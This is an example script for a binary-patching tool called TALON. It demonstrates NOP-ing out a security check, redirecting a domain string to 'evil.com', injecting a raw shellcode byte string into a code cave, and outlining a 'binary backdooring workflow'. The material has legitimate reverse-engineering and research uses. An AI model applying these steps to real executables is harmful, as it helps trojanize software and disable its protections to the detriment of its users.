// Binary Patching Example - Demonstrates semantic binary modification
//
// This example shows how to use TALON's binary patching capabilities to:
// - NOP out instructions
// - Replace function calls
// - Inject assembly code
// - Patch strings
// - Inject shellcode
// - Create code caves
// - Recalculate headers

// Load target binary for patching
let binary = "/tmp/target_binary"
let p = Patch(binary)

// Example 1: NOP out a security check
// Disable a length check at offset 0x1234 by NOPping 10 bytes
patch_nop_out(p, 0x1234, 10)

// Example 2: Replace a function call
// Redirect a call to exit() to our custom handler
patch_replace_call(p, 0x5678, "custom_exit")

// Example 3: Insert assembly code (requires keystone-engine feature)
// Insert a custom instruction sequence at offset 0x9abc
patch_insert_asm(p, 0x9abc, "xor eax, eax; ret")

// Example 4: Patch strings
// Replace error messages or domain names
patch_patch_string(p, "example.com", "evil.com")

// Example 5: Inject shellcode at end of binary
let shellcode = b"\x31\xc0\x48\x89\xc7\x48\x89\xc6\x48\x89\xc2\xb0\x3b\x0f\x05"
let injection_offset = patch_inject_shellcode(p, shellcode)
print("Shellcode injected at offset: " + hex(injection_offset))

// Example 6: Create a code cave for larger payloads
let cave_offset = patch_create_code_cave(p, 512)
print("Code cave created at offset: " + hex(cave_offset))

// Example 7: Dry-run mode - preview changes without modifying file
patch_set_dry_run(p, 1)
patch_nop_out(p, 0x1000, 20)
let preview = patch_preview_diff(p)
print(preview)

// Example 8: Recalculate ELF/PE headers after modifications
patch_recalculate_headers(p)

// Example 9: Find patterns in binary
let pattern = b"\x48\x89\xe5"  // mov rbp, rsp
let offsets = patch_find_pattern(p, pattern)
print("Found pattern at offsets: " + str(offsets))

// Example 10: Verify integrity with SHA256 checksum
let is_valid = patch_verify_integrity(p)
print("Integrity check: " + str(is_valid))

// Example 11: Rollback changes if needed
patch_undo(p)  // Undo last operation
patch_rollback_all(p)  // Rollback all operations

// Example 12: Save patched binary
patch_save(p, "/tmp/patched_binary")

// Advanced Example: Complete binary backdooring workflow
//
// 1. Load binary and enable dry-run for testing
// 2. Find entry point or suitable injection point  
// 3. Create code cave for payload
// 4. Inject shellcode into code cave
// 5. Patch entry point to jump to shellcode
// 6. Restore original execution flow after payload
// 7. Recalculate headers
// 8. Verify checksum
// 9. Test with dry-run
// 10. Save final patched binary

print("[+] Binary patching examples complete")
